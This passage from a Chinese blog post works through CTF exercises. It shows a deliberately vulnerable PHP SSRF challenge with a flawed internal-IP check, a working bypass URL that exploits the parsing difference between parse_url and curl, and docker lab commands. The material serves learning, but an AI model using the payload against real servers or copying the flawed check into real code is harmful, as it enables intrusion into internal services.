class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  <span class="comment"># 高亮显示当前文件</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="variable">$match_result</span>=preg_match(<span class="string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>); </span><br><span class="line">    <span class="comment">// ^ 匹配行的开始</span></span><br><span class="line">    <span class="comment">// (xyz) 字符组，按照确切的顺序匹配字符 xyz</span></span><br><span class="line">    <span class="comment">// | 分支结构，匹配符号之前的字符或后面的字符</span></span><br><span class="line">    <span class="comment">// ? 	匹配前面的子表达式零次或一次，或指明一个非贪婪限定符</span></span><br><span class="line">    <span class="comment">// \ 转义符，它可以还原元字符原来的含义，允许你匹配保留字符 [ ] ( ) &#123; &#125; . * + ? ^ $ \ |</span></span><br><span class="line">    <span class="comment">// . 匹配除换行符以外的任意字符</span></span><br><span class="line">    <span class="comment">// * 匹配前面的子表达式零次或多次</span></span><br><span class="line">    <span class="comment">// $ 匹配行的结束</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">try</span> </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$url_parse</span>=parse_url(<span class="variable">$url</span>); </span><br><span class="line">        <span class="comment">// 分解出一个URL的各个部分，返回数组。这是 php 的方法，各种语言对 URL 各部分解析规则会各不一样</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>]; </span><br><span class="line">    <span class="variable">$ip</span>=gethostbyname(<span class="variable">$hostname</span>); </span><br><span class="line">    <span class="variable">$int_ip</span>=ip2long(<span class="variable">$ip</span>); </span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip(<span class="variable">$url</span>)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();  <span class="comment"># 初始化</span></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>); </span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);  <span class="comment">#  //抓取URL并把它传递给浏览器，实际上由于解析规则，获得的域名与 php parse_url 方法获得的不一样</span></span><br><span class="line">        <span class="variable">$result_info</span> = curl_getinfo(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]) </span><br><span class="line">        &#123; </span><br><span class="line">            safe_request_url(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]); </span><br><span class="line">        &#125; </span><br><span class="line">        curl_close(<span class="variable">$ch</span>); </span><br><span class="line">        var_dump(<span class="variable">$output</span>); </span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123; </span><br><span class="line">    safe_request_url(<span class="variable">$url</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>URL 都要经过 check_inner_ip 函数检测，但 php_url_parse 和 curl 对 url 的解析是不同的，强烈看看这篇文章 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86527">【Blackhat】SSRF的新纪元：在编程语言中利用URL解析器</a><br> <img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_ssrf_1_url.png" alt="ssrf"></p>
</li>
<li><p>直接构造<code>?url=http://a@127.0.0.1:80@baidu.com/flag.php</code></p>
</li>
<li><p>后续还有 MySQL、Redies，我是跟着这个博客做的 <a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/108930033?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161604810616780255279438%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161604810616780255279438&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-108930033.pc_search_result_cache&utm_term=%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5C">《从0到1：CTFer成长之路》 配套题目Web WP</a></p>
<ol>
<li>查看已经运行的docker镜像 <code>sudo docker ps -a</code></li>
<li>连接到mysql镜像中 <code>sudo docker exec -it 2-web-ssrf_mysql_1 bash</code>,2-web-ssrf_mysql_1 在上一步查看镜像时 NAMES 的内容。<a target="_blank" rel="noopener" href="https://www.php.cn/docker/445365.html">怎么访问docker内的MySQL</a></li>
</ol>
<ul>
<li>将 docker 容器中的文件传递到主机:<code>sudo docker cp 2-web-ssrf_mysql_1:/pcap/mysql.pcap /home/chang/</code></li>
</ul>
</li>
</ol>
<h2 id="2-2-命令执行漏洞"><a href="#2-2-命令执行漏洞" class="headerlink" title="2.2 命令执行漏洞"></a>2.2 命令执行漏洞</h2><p>这道题主要是看博文，弄懂 linux文件描述符 和 反弹shell原理再看 writeup 基本上没什么难度了。</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/108930033?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161604810616780255279438%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161604810616780255279438&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-108930033.pc_search_result_cache&utm_term=%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5C">《从0到1：CTFer成长之路》 配套题目Web WP</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_1_1">反弹Shell原理及检测技术研究</a></li>
<li><a href="https://cs-cshi.github.io/2021/03/23/%E5%BD%BB%E5%BA%95%E5%BC%84%E6%87%82%20Linux%20%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%EF%BC%88fd%EF%BC%89/%E5%BD%BB%E5%BA%95%E5%BC%84%E6%87%82%20Linux%20%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%EF%BC%88fd%EF%BC%89/">彻底弄懂 Linux 下的文件描述符（fd）</a></li>
</ul>

    </div>

    
    
    
      
  <div class="popular-posts-header">相关文章推荐</div>
  <ul class="popular-posts">
    <li class="popular-posts-item">
      <div class="popular-posts-title"><a href="\tcpdump\" rel="bookmark">tcpdump</a></div>
    </li>
    <li class="popular-posts-item">
      <div class="popular-posts-title"><a href="\wireshark\" rel="bookmark">wireshark</a></div>
    </li>
    <li class="popular-posts-item">
      <div class="popular-posts-title"><a href="\cybersecurity\XCTF题目\" rel="bookmark">XCTF 攻防世界刷题</a></div>
    </li>
    <li class="popular-posts-item">
      <div class="popular-posts-title"><a href="\cybersecurity\netcat\" rel="bookmark">netcat</a></div>
    </li>
    <li class="popular-posts-item">
      <div class="popular-posts-title"><a href="\cybersecurity\信息安全产品\" rel="bookmark">信息安全产品</a></div>
    </li>
  </ul>

        <div class="reward-container">
  <div></div>
  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
    打赏
  </button>
  <div id="qr" style="display: none;">
      
      <div style="display: inline-block;">
        <img src="/images/wechatpay.png" alt="Charles 微信支付">
        <p>微信支付</p>
      </div>
      
      <div style="display: inline-block;">
        <img src="/images/alipay.jpg" alt="Charles 支付宝">
        <p>支付宝</p>
      </div>

  </div>
</div>

        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>Charles
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://cs-cshi.github.io/cybersecurity/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8B%E9%85%8D%E5%A5%97%E9%A2%98%E7%9B%AE/" title="《从0到1：CTFer成长之路》配套题目">https://cs-cshi.github.io/cybersecurity/《从0到1：CTFer成长之路》配套题目/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag"># 网络安全</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item"></div>
      <div class="post-nav-item">
    <a href="/hexo-blog/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%20Github%20+%20Hexo%20%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/" rel="next" title="如何使用 Github + Hexo 搭建博客">
      如何使用 Github + Hexo 搭建博客 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录 | toc
        </li>
        <li class="sidebar-nav-overview">
          站点概览 | overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-Web-%E5%85%A5%E9%97%A8"><span class="nav-text">第一章 Web 入门</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-text">1.1 信息搜集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-1-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%90%9C%E9%9B%86"><span class="nav-text">1.1.1 常见的搜集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-2-%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E"><span class="nav-text">1.1.2 粗心的小李</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-SQL%E6%B3%A8%E5%85%A5"><span class="nav-text">1.2 SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-1-SQL%E6%B3%A8%E5%85%A5-1"><span class="nav-text">1.2.1 SQL注入-1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-2-SQL%E6%B3%A8%E5%85%A5-2"><span class="nav-text">1.2.2 SQL注入-2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="nav-text">1.3 任意文件读取漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-1-afr-1"><span class="nav-text">1.3.1 afr_1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-2-afr-2"><span class="nav-text">1.3.2 afr_2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-3-afr-3"><span class="nav-text">1.3.3 afr_3</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0-Web-%E8%BF%9B%E9%98%B6"><span class="nav-text">第二章 Web 进阶</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-SSRF%E6%BC%8F%E6%B4%9E"><span class="nav-text">2.1 SSRF漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-text">2.2 命令执行漏洞</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Charles"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">Charles</p>
  <div class="site-description" itemprop="description">慢下来，记录生活点滴，畅游人类知识和艺术的海洋。</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">44</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">25</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">14</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/cs-cshi" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;cs-cshi" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="/572081809@qq.com" title="E-Mail → 572081809@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



  <div class="links-of-recent-posts motion-element">
    <div class="links-of-recent-posts-title">
      <i class="fa fa-history fa-fw"></i>
      最近文章
    </div>
    <ul class="links-of-recent-posts-list">
        <li class="links-of-recent-posts-item">
          <a href="/dataStrutures/leetcode/" title="dataStrutures&#x2F;leetcode&#x2F;">leetcode 刷题</a>
        </li>
        <li class="links-of-recent-posts-item">
          <a href="/Virtualbox%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F%E8%AF%A6%E8%A7%A3/" title="Virtualbox虚拟机网络连接方式详解&#x2F;">Virtualbox虚拟机网络连接方式详解</a>
        </li>
        <li class="links-of-recent-posts-item">
          <a href="/cybersecurity/XCTF%E9%A2%98%E7%9B%AE/" title="cybersecurity&#x2F;XCTF题目&#x2F;">XCTF 攻防世界刷题</a>
        </li>
        <li class="links-of-recent-posts-item">
          <a href="/cybersecurity/Metasploit%20Framework/" title="cybersecurity&#x2F;Metasploit Framework&#x2F;">Metasploit Framework</a>
        </li>
        <li class="links-of-recent-posts-item">
          <a href="/pyshark%20%E8%A7%A3%E6%9E%90pcap%E8%8E%B7%E5%BE%97%20http%20header/" title="pyshark 解析pcap获得 http header&#x2F;">pyshark 解析 pcap 获取 http header</a>
        </li>
    </ul>
  </div>

      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Charles</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">站点总字数：</span>
    <span title="站点总字数">238k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">3:36</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  
  <script src="//cdn.jsdelivr.net/npm/quicklink@1/dist/quicklink.umd.js"></script>
  <script>
      window.addEventListener('load', () => {
      quicklink({
        timeout : 3000,
        priority: true,
        ignores : [uri => uri.includes('#'),uri => uri === 'https://cs-cshi.github.io/cybersecurity/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8B%E9%85%8D%E5%A5%97%E9%A2%98%E7%9B%AE/',]
      });
      });
  </script>


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : false,
      appId      : 'hbdf2zNhxCCzlSuodiOKirnE-gzGzoHsz',
      appKey     : 'gJuRc9Mu4JIB0czCtRefSodC',
      placeholder: "Just go go",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : false,
      lang       : '' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>

</body>
</html>
